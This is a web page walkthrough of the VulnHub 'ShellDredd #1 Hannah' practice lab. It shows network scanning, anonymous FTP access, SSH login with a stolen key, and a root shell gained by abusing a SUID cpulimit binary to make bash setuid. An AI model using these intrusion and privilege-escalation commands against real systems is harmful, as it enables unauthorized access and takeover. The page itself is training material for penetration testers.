<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">ShellDredd #1 Hannah Vulnhub Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/shelldredd-1-hannah-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2020-09-19T17:04:18+00:00">September 19, 2020</time><time class="updated" datetime="2025-07-10T18:34:19+00:00">July 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Today we will solve a new boot2root challenge named “<strong>ONSYSTEM: SHELLDREDD # 1 HANNAH</strong>“. This lab is made for penetration testing practices and it is available on VulnHub and we can download it from <span style="color: #0000ff;"><strong>here</strong></span>. The credit goes to <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/d4t4s3c">d4t4s3c</a></strong> </span>for creating this lab. Let’s start, and learn how to break it down successfully.</span></p>
<p><span style="color: #000000;"><strong>Level: Easy</strong></span></p>
<h3><span style="color: #800000;">Penetration Testing Methodology</span></h3>
<ul>
<li><span style="color: #000000;"><strong>Network Scanning</strong></span>
<ul>
<li><span style="color: #000000;">netdiscover</span></li>
<li><span style="color: #000000;">nmap</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Enumeration </strong></span>
<ul>
<li><span style="color: #000000;">FTP login</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Exploiting</strong></span>
<ul>
<li><span style="color: #000000;">SSH</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Post Exploitation</strong></span>
<ul>
<li><span style="color: #000000;">Enumeration for Sudo Permission</span></li>
<li><span style="color: #000000;">Enumeration for SUID</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Privilege Escalation</strong></span>
<ul>
<li><span style="color: #000000;">SUID permission on cpulimit</span></li>
</ul>
</li>
</ul>
<p><span style="color: #000000;">Now Let’s start this walkthrough</span></p>
<h3><span style="color: #800000;">Network Scanning</span></h3>
<p><span style="color: #000000;">Using netdiscover we will scan the network for the target machine to find the IP Address. We need to match the MAC Address of the Target Machine with the IP Addresses that was shown by the netdiscover command. On 192.168.0.121 the target machine was active.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">netdiscover</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-tcFXXw78gWU/X2Y4hF0--JI/AAAAAAAAopE/i0TOe0ttNFsi9GZRaOwOYVSdLFpBRLygACLcBGAsYHQ/s16000/1.png"/></span></p>
<p><span style="color: #000000;">Let’s do a port or a services scan. We will be using the nmap tool to see which ports are available. As shown in the image below, the result of nmap shows that port FTP (21) and SSH (61000) services are available.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -p- -A 192.168.0.121</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-bBE5B3m3i5Y/X2Y4oISIK8I/AAAAAAAAopI/ujK5mWYi5DYJAAXZecIfBdEiYBscHLPaACLcBGAsYHQ/s16000/2.png"/></span></p>
<h3><span style="color: #800000;">Enumeration</span></h3>
<p><span style="color: #000000;">It was quite clear from the Nmap scan that the FTP service has Anonymous Login Enabled by default. So, let’s login as Anonymous to further enumerate the service.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ftp 192.168.0.121
Anonymous</pre>
<p><span style="color: #000000;">After logging in, we listed the contents of the directory using the ls command but it was worthless. After this, it came to us that the directories might be hidden. So, now it’s time to use the la option in ls command to list all the files inside the current working directory. Then we found out a hidden directory called (<strong>.hannah</strong>) in this directory we can find out an SSH key.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ls
ls-la
cd .hannah
ls-la</pre>
<p><span style="color: #000000;">We use the get command to transfer this key in our local system aka Kali Linux.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">get id_rsa</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-wqBO_LF15gc/X2Y4tMhtKGI/AAAAAAAAopM/RSvd6sRj0bYAd5GRV4lH0mvkEw3AS-BaQCLcBGAsYHQ/s16000/3.png"/></span></p>
<h3><span style="color: #800000;">Exploiting</span></h3>
<p><span style="color: #000000;">Now as we have downloaded the SSH key from the FTP server, the major concern is that it might have improper permissions. The SSH key requires a specific set of permissions. The key must have the read and write permissions on the User or Owner. That means we need to add 600 permission. After setting appropriate permission, it’s time to login using the SSH key.  If we remember correctly from the Nmap scan, the SSH service is running on the port 61000.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">chmod 600 id_rsa
ssh -i id_rsa hannah@192.168.0.121 -p 61000</pre>
<p><span style="color: #000000;">We get access to the Hannah user.</span></p>
<h3><span style="color: #800000;"><strong>Post Exploitation</strong></span></h3>
<p><span style="color: #000000;">Now that we have a session on the target machine, its time to enumerate. We list all the files in the directory and find a file named user.txt. This might be the user flag.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ls
cat user.txt</pre>
<p><span style="color: #000000;">Now that the user flag is found, its time to elevate privileges and look for the binaries that can be run as sudo.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo -l</pre>
<p><span style="color: #000000;">Much to our demise, there isn’t any binary or script that can be run as sudo.</span></p>
<p><span style="color: #000000;">Next on our docket is SUID permissions. We can enumerate all binaries having SUID permissions with the help of the find command as shown in the image below.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">find / -perm -u=5 -type f 2&gt;/dev/null</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Yxpg4ORgz08/X2Y4z6Z0AxI/AAAAAAAAopY/Zj7vj98F88I8zPoNk0Z5RTe3wQJlIRdTQCLcBGAsYHQ/s16000/4.png"/></span></p>
<p><span style="color: #000000;">We find that there is a binary called cpulimit that have the SUID permissions. Time to exploit it.</span></p>
<h3><span style="color: #800000;"><strong>Privilege Escalation</strong></span></h3>
<p><span style="color: #000000;">We can use this cpulimit to run commands which we don’t have permissions to run like mkdir, cp, etc. but to use we need to move in <strong>/tmp</strong> directory as it is the only directory which has write permissions. Next, we change the permission for the bash file and copy its contents to the directory we created i.e., ignite. Then we apply the execution permissions to the bash inside the ignite directory.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /tmp
cpulimit -l 100 -f mkdir /ignite
cpulimit -l 100 -f chmod 4755 /usr/bin/bash
cpulimit -l 100 -f cp /usr/bin/bash /ignite
cpulimit -l 100 -f chmod +s /ignite/bash
./bash -p</pre>
<p><span style="color: #000000;">Then BOOM!! we got the root we can check its <strong>id</strong> and in the root directory we found out its <strong>root.txt</strong>. After executing this file, Hurray!! we got our root flag.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /root
ls
cat root.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-MlSDWCRAmS0/X2Y44625M0I/AAAAAAAAopg/BPhPpx4poQoPsBojF7zvpzl-UoChr5IFgCLcBGAsYHQ/s16000/5.png"/></span></p>
<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more VulnHub Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
<p><span style="color: #000000;"><strong>Author: </strong>Shubham Sharma is a Pentester and Cybersecurity Researcher, Contact <strong><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.linkedin.com/in/shubham-sharma-626964153/">LinkedIn</a></span>, </strong>and <strong><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://twitter.com/Shubham_pen">Twitter</a></span>.</strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
